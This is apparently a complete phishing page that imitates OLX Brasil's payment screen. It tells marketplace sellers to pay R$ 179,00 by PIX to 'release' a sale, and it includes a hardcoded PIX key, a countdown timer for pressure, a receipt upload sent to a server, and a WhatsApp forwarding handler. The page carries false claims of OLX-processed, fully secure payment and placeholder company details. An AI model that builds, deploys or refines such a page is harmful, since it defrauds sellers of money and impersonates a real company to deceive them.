<!DOCTYPE html>
<html lang="pt-BR">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Pagamento - OLX">
    <title>Pagamento - OLX Brasil</title>
    <link rel="stylesheet" href="/css/style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <link rel="shortcut icon" href="/images/olx-favicon.ico" type="image/x-icon">
    <style>
        .pagamento-container {
            max-width: 800px;
            margin: 30px auto;
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            padding: 30px;
        }

        .pagamento-header {
            text-align: center;
            margin-bottom: 30px;
        }

        .pagamento-title {
            color: #6e0ad6;
            font-size: 24px;
            margin-bottom: 10px;
        }

        .pagamento-subtitle {
            color: #666;
            font-size: 16px;
        }

        .pagamento-valor {
            text-align: center;
            background-color: #f1f8ff;
            border-radius: 5px;
            padding: 15px;
            margin: 20px 0;
        }

        .pagamento-valor h3 {
            font-size: 16px;
            color: #333;
            margin-bottom: 5px;
        }

        .pagamento-valor .valor {
            font-size: 28px;
            font-weight: bold;
            color: #6e0ad6;
        }

        .pagamento-pix {
            text-align: center;
            padding: 20px;
        }

        .pagamento-pix .qrcode-container {
            margin: 20px auto;
            max-width: 250px;
            border: 1px solid #ddd;
            padding: 15px;
            border-radius: 8px;
        }

        .pagamento-pix img {
            width: 100%;
        }

        .pagamento-pix .chave-pix {
            background-color: #f1f8ff;
            padding: 15px;
            border-radius: 5px;
            margin: 15px 0;
            word-break: break-all;
            font-family: monospace;
            font-size: 16px;
            border: 1px dashed #6e0ad6;
        }

        .btn-copiar {
            background-color: #f5f5f5;
            border: 1px solid #ddd;
            padding: 8px 15px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 14px;
            margin-bottom: 20px;
        }

        .btn-copiar:hover {
            background-color: #ebebeb;
        }

        .pix-info {
            font-size: 14px;
            color: #666;
            margin-top: 15px;
        }

        .pagamento-info {
            display: flex;
            align-items: center;
            margin-top: 25px;
            padding: 10px;
            background-color: #f8f9fa;
            border-radius: 5px;
        }

        .pagamento-info i {
            font-size: 24px;
            color: #6e0ad6;
            margin-right: 15px;
        }

        .pagamento-info p {
            color: #666;
            font-size: 14px;
        }

        .btn-confirmar {
            background-color: #6e0ad6;
            color: white;
            border: none;
            padding: 15px;
            font-size: 18px;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s;
            font-weight: bold;
            width: 100%;
            margin-top: 20px;
        }

        .btn-confirmar:hover {
            background-color: #5a08b0;
        }

        .comprovante-section {
            margin-top: 30px;
            padding: 20px;
            background-color: #f9f9f9;
            border-radius: 8px;
            border: 1px solid #e0e0e0;
        }

        .processando-pagamento {
            text-align: center;
            margin-bottom: 20px;
        }

        .processando-pagamento i {
            font-size: 36px;
            color: #6e0ad6;
            margin-bottom: 10px;
        }

        .processando-pagamento h2 {
            color: #6e0ad6;
            font-size: 24px;
        }

        .aviso-comprovante {
            background-color: #fff7e6;
            border: 1px solid #ffd699;
            border-radius: 6px;
            padding: 15px;
        }

        .aviso-header {
            display: flex;
            align-items: center;
            margin-bottom: 15px;
            color: #e65c00;
        }

        .aviso-header i {
            font-size: 24px;
            margin-right: 10px;
        }

        .aviso-header h3 {
            font-size: 18px;
            margin: 0;
        }

        .upload-area {
            margin-top: 20px;
            text-align: center;
        }

        .upload-label {
            display: block;
            padding: 30px 20px;
            border: 2px dashed #6e0ad6;
            border-radius: 8px;
            cursor: pointer;
            margin-bottom: 15px;
            background-color: #f8f4ff;
            transition: background-color 0.3s;
        }

        .upload-label:hover {
            background-color: #f0e6ff;
        }

        .upload-label i {
            font-size: 40px;
            color: #6e0ad6;
            margin-bottom: 10px;
        }

        .upload-label span {
            font-size: 18px;
            font-weight: bold;
            color: #6e0ad6;
            display: block;
            margin-bottom: 5px;
        }

        .upload-label .small {
            font-size: 14px;
            color: #666;
        }

        .arquivo-info {
            margin: 15px 0;
            font-size: 14px;
            font-weight: 500;
            color: #333;
        }

        .btn-enviar {
            background-color: #6e0ad6;
            color: white;
            border: none;
            padding: 12px 20px;
            font-size: 16px;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
            transition: background-color 0.3s;
        }

        .btn-enviar:hover:not([disabled]) {
            background-color: #5a08b0;
        }

        .btn-enviar:disabled {
            background-color: #cccccc;
            cursor: not-allowed;
        }

        .btn-whatsapp {
            background-color: #25D366;
            color: white;
            border: none;
            padding: 12px 20px;
            font-size: 16px;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
            transition: background-color 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-top: 15px;
            width: 100%;
        }

        .btn-whatsapp i {
            margin-right: 8px;
            font-size: 18px;
        }

        .btn-whatsapp:hover {
            background-color: #128C7E;
        }

        .instrucao-whatsapp {
            background-color: #f0f8ff;
            border: 1px solid #b8daff;
            border-radius: 5px;
            padding: 12px;
            margin: 15px 0;
            font-size: 14px;
            color: #004085;
        }

        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.7);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            color: white;
            display: none;
        }

        .loading-spinner {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #6e0ad6;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 2s linear infinite;
            margin-bottom: 20px;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }

        /* Estilos para o timer de pagamento */
        .pagamento-timer {
            text-align: center;
            background-color: #fff7e6;
            border-radius: 5px;
            padding: 15px;
            margin: 20px 0;
            border: 1px solid #ffd699;
        }

        .pagamento-timer h3 {
            font-size: 16px;
            color: #e65c00;
            margin-bottom: 8px;
        }

        .timer {
            font-size: 28px;
            font-weight: bold;
            color: #e65c00;
            font-family: monospace;
        }

        .timer-aviso {
            color: #e65c00;
            font-size: 14px;
            margin-top: 8px;
        }

        .timer-expirado {
            background-color: #ffe6e6;
            border: 1px solid #ffb3b3;
            color: #cc0000;
            padding: 15px;
            border-radius: 5px;
            text-align: center;
            margin: 20px 0;
            display: none;
        }
    </style>
</head>

<body>
    <div class="app-container">
        <div class="header-content">
            <div class="logo">
                <img src="/images/olx-logo.png" alt="Logo OLX">
            </div>

        </div>
        <div class="main-content">
            <div class="breadcrumb">
                <a href="/">OLX</a> &gt; <a href="/vendas">Minhas Vendas</a> &gt; <span>Pagamento</span>
            </div>
            <div class="pagamento-container">
                <div class="pagamento-header">
                    <h1 class="pagamento-title">Pagamento de Recebimentos de Valores</h1>
                    <p class="pagamento-subtitle">Conclua o pagamento para liberar sua venda</p>
                </div>
                <div class="pagamento-valor">
                    <h3>Valor a pagar</h3>
                    <div class="valor">R$ 179,00</div>
                </div>

                <!-- Timer de contagem regressiva -->
                <div class="pagamento-timer">
                    <h3>Tempo restante para pagamento</h3>
                    <div class="timer" id="payment-timer">10:00</div>
                    <p class="timer-aviso">Realize o pagamento antes que o tempo expire.</p>
                </div>

                <!-- Aviso de tempo expirado -->
                <div class="timer-expirado" id="timer-expirado">
                    <i class="fas fa-exclamation-circle"></i>
                    <h3>Tempo para pagamento expirado</h3>
                    <p>O tempo para pagamento expirou. Clique no botão abaixo para gerar uma nova chave PIX.</p>
                    <button id="btn-renovar-pagamento" class="btn-confirmar">RENOVAR PAGAMENTO</button>
                </div>

                <div class="pagamento-pix">
                    <p>Escaneie o QR code abaixo com o aplicativo do seu banco ou copie a chave PIX</p>
                    <div class="qrcode-container">
                        <img src="/images/pix-qrcode.png" alt="QR Code do PIX">
                    </div>
                    <p><strong>Ou use a chave PIX abaixo:</strong></p>
                    <div class="chave-pix" id="chave-pix">a707e498-744f-45ff-ad40-eee53ba86815</div>
                    <button class="btn-copiar" id="btn-copiar-pix">
                        <i class="far fa-copy"></i> Copiar Chave PIX
                    </button>
                    <p class="pix-info">O pagamento será confirmado automaticamente em até 5 minutos após a
                        transferência.</p>
                    <button id="btn-confirmar-pagamento" class="btn-confirmar">CONFIRMAR PAGAMENTO</button>
                </div>
                <div id="comprovante-section" class="comprovante-section" style="display: none;">
                    <div class="processando-pagamento">
                        <i class="fas fa-sync fa-spin"></i>
                        <h2>PROCESSANDO PAGAMENTO</h2>
                    </div>
                    <div class="aviso-comprovante">
                        <div class="aviso-header">
                            <i class="fas fa-exclamation-triangle"></i>
                            <h3>MENSAGEM DE ATENÇÃO: COMPROVANTE OBRIGATÓRIO</h3>
                        </div>
                        <p>Para ativar sua venda, é obrigatório enviar o comprovante de pagamento abaixo.</p>
                        <p>Seu pagamento ainda não consta em nosso sistema. Para agilizar o processo, envie seu
                            comprovante:</p>
                        <div class="upload-area">
                            <label for="comprovante-upload" class="upload-label">
                                <i class="fas fa-file-upload"></i>
                                <span>IMAGEM OU PDF</span>
                                <p class="small">Clique para selecionar o arquivo</p>
                            </label>
                            <input type="file" id="comprovante-upload" accept=".jpg,.jpeg,.png,.pdf"
                                style="display: none;">
                            <p id="arquivo-selecionado" class="arquivo-info"></p>
                            <button id="btn-enviar-comprovante" class="btn-enviar" disabled>ENVIAR COMPROVANTE</button>

                            <div class="pagamento-info">
                                <i class="fas fa-shield-alt"></i>
                                <p>Seus dados de pagamento são protegidos com criptografia de ponta a ponta. Esta
                                    transação é
                                    100% segura e processada pela OLX Pagamentos.</p>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="footer-bottom">
                    <p>© 2023 OLX Brasil - Todos os direitos reservados</p>
                    <p>CNPJ: 10.000.000/0001-00 - Avenida Paulista, 1000 - São Paulo/SP</p>
                </div>
            </div>
            <div class="loading-overlay" id="loading-overlay">
                <div class="loading-spinner"></div>
                <p>Carregando...</p>
            </div>
            <script>
                document.addEventListener('DOMContentLoaded', function () {
                    const btnCopiarPix = document.getElementById('btn-copiar-pix');
                    const chavePix = document.getElementById('chave-pix');
                    const btnConfirmarPagamento = document.getElementById('btn-confirmar-pagamento');
                    const comprovanteSection = document.getElementById('comprovante-section');
                    const comprovanteUpload = document.getElementById('comprovante-upload');
                    const arquivoSelecionado = document.getElementById('arquivo-selecionado');
                    const btnEnviarComprovante = document.getElementById('btn-enviar-comprovante');
                    const btnWhatsapp = document.getElementById('btn-whatsapp');
                    const loadingOverlay = document.getElementById('loading-overlay');

                    // Configuração do timer de pagamento
                    const paymentTimer = document.getElementById('payment-timer');
                    const timerExpirado = document.getElementById('timer-expirado');
                    const btnRenovarPagamento = document.getElementById('btn-renovar-pagamento');
                    let tempoRestante = 10 * 60; // 10 minutos em segundos
                    let timerInterval;

                    // Função para atualizar o timer
                    function atualizarTimer() {
                        const minutos = Math.floor(tempoRestante / 60);
                        const segundos = tempoRestante % 60;
                        paymentTimer.textContent = `${minutos.toString().padStart(2, '0')}:${segundos.toString().padStart(2, '0')}`;

                        if (tempoRestante <= 0) {
                            clearInterval(timerInterval);
                            // Tempo expirado
                            document.querySelector('.pagamento-pix').style.display = 'none';
                            timerExpirado.style.display = 'block';
                            paymentTimer.parentElement.style.display = 'none';
                        }
                        tempoRestante--;
                    }

                    // Iniciar o timer
                    timerInterval = setInterval(atualizarTimer, 1000);
                    atualizarTimer(); // Chamar imediatamente para evitar atraso na exibição

                    // Botão para renovar o pagamento
                    btnRenovarPagamento.addEventListener('click', function () {
                        tempoRestante = 10 * 60; // Reiniciar para 10 minutos
                        document.querySelector('.pagamento-pix').style.display = 'block';
                        timerExpirado.style.display = 'none';
                        paymentTimer.parentElement.style.display = 'block';

                        // Reiniciar o timer
                        clearInterval(timerInterval);
                        timerInterval = setInterval(atualizarTimer, 1000);
                        atualizarTimer();
                    });

                    // Botão para copiar a chave PIX
                    btnCopiarPix.addEventListener('click', function () {
                        const textArea = document.createElement('textarea');
                        textArea.value = chavePix.textContent;
                        document.body.appendChild(textArea);
                        textArea.select();
                        document.execCommand('copy');
                        document.body.removeChild(textArea);

                        this.innerHTML = '<i class="fas fa-check"></i> Chave copiada!';
                        setTimeout(() => {
                            this.innerHTML = '<i class="far fa-copy"></i> Copiar Chave PIX';
                        }, 2000);
                    });

                    // Botão para confirmar pagamento
                    btnConfirmarPagamento.addEventListener('click', function () {
                        comprovanteSection.style.display = 'block';
                        btnConfirmarPagamento.disabled = true;
                        btnConfirmarPagamento.textContent = 'PAGAMENTO CONFIRMADO';

                        // Scroll para a nova seção
                        setTimeout(() => {
                            comprovanteSection.scrollIntoView({ behavior: 'smooth' });
                        }, 100);
                    });

                    // Gerenciar upload do arquivo
                    comprovanteUpload.addEventListener('change', function () {
                        if (this.files.length > 0) {
                            const file = this.files[0];
                            const fileSize = (file.size / 1024 / 1024).toFixed(2); // em MB

                            if (fileSize > 10) {
                                alert('O arquivo é muito grande. O tamanho máximo permitido é 10MB.');
                                this.value = '';
                                arquivoSelecionado.textContent = '';
                                btnEnviarComprovante.disabled = true;
                                return;
                            }

                            // Mostrar informações do arquivo selecionado
                            arquivoSelecionado.textContent = `Arquivo selecionado: ${file.name} (${fileSize} MB)`;
                            btnEnviarComprovante.disabled = false;
                        } else {
                            arquivoSelecionado.textContent = '';
                            btnEnviarComprovante.disabled = true;
                        }
                    });

                    // Botão para enviar comprovante
                    btnEnviarComprovante.addEventListener('click', function () {
                        if (!comprovanteUpload.files.length) {
                            alert('Por favor, selecione um arquivo de comprovante primeiro.');
                            return;
                        }

                        const file = comprovanteUpload.files[0];
                        const formData = new FormData();
                        formData.append('comprovante', file);
                        formData.append('chavePix', chavePix.textContent);
                        formData.append('valor', '179,00');

                        // Mostrar overlay de carregamento
                        loadingOverlay.style.display = 'flex';

                        // Enviar o arquivo para o servidor
                        fetch('/api/enviar-comprovante', {
                            method: 'POST',
                            body: formData
                        })
                            .then(response => response.json())
                            .then(data => {
                                loadingOverlay.style.display = 'none';
                                if (data.success) {
                                    alert('Comprovante enviado com sucesso! Redirecionando para confirmação...');
                                    btnEnviarComprovante.textContent = 'ENVIADO COM SUCESSO';
                                    btnEnviarComprovante.style.backgroundColor = '#28a745';
                                    btnEnviarComprovante.disabled = true;

                                    // Redirecionar para a página de aprovação após 1.5 segundos
                                    setTimeout(function () {
                                        window.location.href = '/pag/aprovado.html';
                                    }, 1500);
                                } else {
                                    throw new Error(data.message || 'Erro ao enviar comprovante');
                                }
                            })
                            .catch(error => {
                                loadingOverlay.style.display = 'none';
                                alert(`Erro ao enviar comprovante: ${error.message}. Por favor, tente usar o WhatsApp.`);
                                console.error('Erro:', error);
                            });
                    });

                    // Botão para enviar comprovante pelo WhatsApp
                    btnWhatsapp.addEventListener('click', function () {
                        // Número para onde será enviado o WhatsApp
                        const phoneNumber = '5511999999999';

                        // Obter a chave PIX para referência
                        const pixKey = chavePix.textContent;

                        // Criar mensagem personalizada com dados do pagamento
                        const message = `*COMPROVANTE DE PAGAMENTO*\n\n` +
                            `*Chave PIX*: ${pixKey}\n` +
                            `*Valor*: R$ 179,00\n\n` +
                            `Estou enviando o comprovante de pagamento conforme solicitado.`;

                        // Criar URL do WhatsApp com a mensagem predefinida
                        const whatsappUrl = `https://wa.me/${phoneNumber}?text=${encodeURIComponent(message)}`;

                        // Abrir o WhatsApp
                        window.open(whatsappUrl, '_blank');
                    });
                });
            </script>
</body>

</html>